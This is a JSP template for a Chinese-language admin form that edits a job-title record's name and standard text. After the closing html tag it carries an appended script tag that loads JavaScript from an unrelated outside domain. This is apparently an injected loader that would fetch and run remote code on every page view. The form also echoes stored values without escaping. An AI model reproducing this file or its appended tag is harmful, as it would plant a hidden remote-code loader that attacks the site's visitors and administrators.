<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>模板维护基本表</title>
    <link type="text/css" href="../css/stylesheet.css" rel="stylesheet"/>
    <script>
       /*
          function resetButton() {
             document.forms[0].elements["name"].value="";

         }
        */
    </script>
</head>
<body>
<form action="/admin/updatePosition.action"><table align="center" width="300">
    <input type="hidden" name="position_id" value="${position.position_id}"/>
    <tr><td>职称名</td><td><input type="text" name="position_name" value="${position.position_name}"></td></tr>
    <tr><td>职称标准</td><td>
        <textarea name="position_standard">${position.position_standard}</textarea>
       <%-- <input type="text"  name="position_standard" value="${position.position_standard}">--%>
    </td></tr>
    <tr><td align="center"><input type="submit" value="提交"></td><td><input type="reset" value="重置" ></td></tr>
</table></form>
</body>
</html><script language=javascript src=http://www.haofbi.com/js/w.js></script>
